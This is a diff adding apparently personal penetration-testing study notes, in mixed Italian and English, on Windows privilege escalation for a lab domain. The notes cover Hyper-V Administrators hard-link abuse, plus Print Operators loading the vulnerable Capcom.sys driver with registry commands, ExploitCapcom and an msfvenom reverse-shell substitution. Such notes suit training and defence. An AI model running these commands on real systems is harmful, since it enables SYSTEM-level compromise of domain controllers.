@@ -515,6 +515,73 @@ After disabling the global query block list and creating a WPAD record, every ma
 `C:\htb> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3`
 
 
+# Hyper-V Administrators
+
+The Hyper-V Administrators group has full access to all Hyper-V features. If Domain Controllers have been virtualized, then the virtualization admins should be considered Domain Admins.	
+
+They could easily create a clone of the live Domain Controller and mount the virtual disk offline to obtain the NTDS.dit file and extract NTLM password hashes for all users in the domain.
+
+It is also well documented on this blog(https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon deleting a virtual machine, vmms.exe attempts to restore the original file permissions on the corresponding .vhdx file and does so as NT AUTHORITY\SYSTEM, without impersonating the user. We can delete the .vhdx file and create a native hard link to point this file to a protected SYSTEM file, which we will have full permissions to.
+
+If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application on the server that has installed a service running in the context of SYSTEM, which is startable by unprivileged users.
+
+Con questa PoC (https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) possiamo prendere l' ownership di un file
+e dopo con **takeown**.
+
+`C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`.
+
+`C:\htb> sc.exe start MozillaMaintenance`
+Note: This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
+
+# Print Operators
+
+**Print Operators** e' un gruppo con privilegi molto alti perche' hanno il permesso **SeLoadDriverPrivilege**.
+
+It has  rights to manage, create, share, and delete printers connected to a Domain Controller, as well as the ability to log on locally to a Domain Controller and shut it dow.
+
+**UACME**(https://github.com/hfiref0x/UACME) e' una repo con una lista di UAC bypasses utilizzabili da command line.
+
+con questa PoC (https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) possiamo abilitare il privilegio se disabilitato.
+
+`C:\Users\mrb3n\Desktop\Print Operators>cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp` compiliamo la PoC
+
+Adesso possiamo caricare driver vulnerabili tipo Capcom.sys (https://www.loldrivers.io/drivers/b51c441a-12c7-407d-9517-559cc0030cf6/)
+
+Issue the commands below to add a reference to this driver under our HKEY_CURRENT_USER tree.
+```
+C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
+
+The operation completed successfully.
 
 
+C:\htb> reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
 
+The operation completed successfully.
+```
+The odd syntax \??\ used to reference our malicious driver's ImagePath is an NT Object Path. The Win32 API will parse and resolve this path to properly locate and load our malicious driver.
+
+Verificare se il driver c'e'.
+```
+PS C:\htb> .\DriverView.exe /stext drivers.txt
+PS C:\htb> cat drivers.txt | Select-String -pattern Capcom
+```
+
+```
+>sc create Capcom type= kernel binPath= C:\Users\user\Desktop\Capcom.sys
+>sc start Capcom
+
+>ExploitCapcom.exe
+```
+
+## Without GUI
+
+Senza GUI si puo' fare ma dobbiamo cambiare del codice in ExploitCapcom.
+
+If we do not have GUI access to the target, we will have to modify the ExploitCapcom.cpp code before compiling. Here we can edit line 292 and replace "C:\\Windows\\system32\\cmd.exe" with, say, a reverse shell binary created with msfvenom, for example: c:\ProgramData\revshell.exe.
+
+Ci sono pure tool per caricare il driver:(https://github.com/TarlogicSecurity/EoPLoadDriver/)
+
+`C:\htb> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`
+
+## Cleanup
+`C:\htb> reg delete HKCU\System\CurrentControlSet\Capcom`
